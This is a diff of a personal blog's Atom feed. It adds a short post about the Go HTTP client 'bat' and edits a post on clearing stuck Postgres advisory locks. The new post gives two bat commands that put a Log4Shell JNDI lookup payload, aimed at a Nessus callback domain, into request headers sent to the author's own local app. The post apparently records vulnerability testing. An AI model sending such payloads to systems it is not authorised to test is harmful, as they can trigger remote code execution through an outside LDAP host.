@@ -1,4 +1,19 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.9.2">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2023-01-03T15:21:49-08:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Rando Software</title><subtitle>Personal rando software blog</subtitle><entry><title type="html">Clearing Postgres Locks</title><link href="http://localhost:4000/postgres/db/2023/01/03/clearing-postgres-locks.html" rel="alternate" type="text/html" title="Clearing Postgres Locks" /><published>2023-01-03T14:07:03-08:00</published><updated>2023-01-03T14:07:03-08:00</updated><id>http://localhost:4000/postgres/db/2023/01/03/clearing-postgres-locks</id><content type="html" xml:base="http://localhost:4000/postgres/db/2023/01/03/clearing-postgres-locks.html">&lt;h1 id=&quot;background&quot;&gt;Background&lt;/h1&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.9.2">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2023-01-06T09:21:58-08:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Rando Software</title><subtitle>Personal rando software blog</subtitle><entry><title type="html">BAT, Golang Http Client</title><link href="http://localhost:4000/http/golang/2023/01/06/bat-golang-http-client.html" rel="alternate" type="text/html" title="BAT, Golang Http Client" /><published>2023-01-06T09:10:03-08:00</published><updated>2023-01-06T09:10:03-08:00</updated><id>http://localhost:4000/http/golang/2023/01/06/bat-golang-http-client</id><content type="html" xml:base="http://localhost:4000/http/golang/2023/01/06/bat-golang-http-client.html">&lt;p&gt;A few days ago I need to to craft some non standard http requests and
+send them to our web application. I’ve used &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;httpie&lt;/code&gt; in the past, but wanted 
+to try something different. Given that golang clients would have all the 
+deps bundled I figured I’d check if there were any good projects on github. 
+I found &lt;a href=&quot;https://github.com/astaxie/bat&quot;&gt;bat&lt;/a&gt; that was really easy to install 
+and worked great. Turns out it was actually inspired by &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;httpie&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;go install github.com/astaxie/bat@latest&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;Then was off to the races:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bat localhost:3000 User-Agent:&quot;\${jndi:ldap://log4shell-generic-HJRowHlwCKDBn2GuIMz7\${lower:ten}.w.nessus.org/nessus}&quot; Content-Type:application/html
+bat localhost:3000 Content-Type:&quot;\${jndi:ldap://log4shell-generic-HJRowHlwCKDBn2GuIMz7\${lower:ten}.w.nessus.org/nessus}&quot;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Will definitely be using this again in the future.&lt;/p&gt;</content><author><name></name></author><category term="http" /><category term="golang" /><summary type="html">A few days ago I need to to craft some non standard http requests and send them to our web application. I’ve used httpie in the past, but wanted to try something different. Given that golang clients would have all the deps bundled I figured I’d check if there were any good projects on github. I found bat that was really easy to install and worked great. Turns out it was actually inspired by httpie</summary></entry><entry><title type="html">Clearing Postgres Locks</title><link href="http://localhost:4000/postgres/db/2023/01/03/clearing-postgres-locks.html" rel="alternate" type="text/html" title="Clearing Postgres Locks" /><published>2023-01-03T14:07:03-08:00</published><updated>2023-01-03T14:07:03-08:00</updated><id>http://localhost:4000/postgres/db/2023/01/03/clearing-postgres-locks</id><content type="html" xml:base="http://localhost:4000/postgres/db/2023/01/03/clearing-postgres-locks.html">&lt;h1 id=&quot;background&quot;&gt;Background&lt;/h1&gt;
 
 &lt;p&gt;Every once in a while I run into issues where a script that uses a Postgres
 Advisory Lock crashes and the lock doesn’t get released. The script is run
@@ -8,11 +23,6 @@ and then shuts down. This will continue forever unless I manually clean up
 the lock.&lt;/p&gt;
 
 &lt;h2 id=&quot;the-clean-up-process&quot;&gt;The Clean up Process&lt;/h2&gt;
-&lt;h3 id=&quot;fyi-view-all-pg-locks&quot;&gt;FYI: View All PG Locks&lt;/h3&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-sql&quot; data-lang=&quot;sql&quot;&gt;&lt;span class=&quot;k&quot;&gt;select&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pg_locks&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;all&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;locks&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
 &lt;h3 id=&quot;view-a-specific-lock&quot;&gt;View A Specific Lock&lt;/h3&gt;
 
 &lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-sql&quot; data-lang=&quot;sql&quot;&gt;&lt;span class=&quot;k&quot;&gt;select&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pg_locks&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;where&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;objid&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;lockid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
@@ -35,8 +45,7 @@ the lock.&lt;/p&gt;
 &lt;span class=&quot;n&quot;&gt;fastpath&lt;/span&gt;           &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;
 &lt;span class=&quot;n&quot;&gt;waitstart&lt;/span&gt;          &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
 
-&lt;p&gt;Among other things, we can see that the pid of the process that initiated this 
-lock. In this case: 28843&lt;/p&gt;
+&lt;p&gt;Among other things, we can see the pid of the process that initiated this lock: 28843&lt;/p&gt;
 
 &lt;h3 id=&quot;stop-the-process&quot;&gt;Stop the Process&lt;/h3&gt;
 
@@ -51,6 +60,8 @@ need to query pg_stat_activity to see if was actually shudown.&lt;/p&gt;
 &lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-sql&quot; data-lang=&quot;sql&quot;&gt;&lt;span class=&quot;k&quot;&gt;select&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pg_stat_activity&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;where&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pid&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;28843&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
 
 &lt;p&gt;If the process is still running, we need to use a more forceful method:&lt;/p&gt;
+
+&lt;h3 id=&quot;seriously-stop-the-process&quot;&gt;Seriously, Stop the Process!&lt;/h3&gt;
 
 &lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-sql&quot; data-lang=&quot;sql&quot;&gt;&lt;span class=&quot;k&quot;&gt;select&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pg_terminatel_backend&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;28843&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
 &lt;span class=&quot;c1&quot;&gt;----------------------------------&lt;/span&gt;
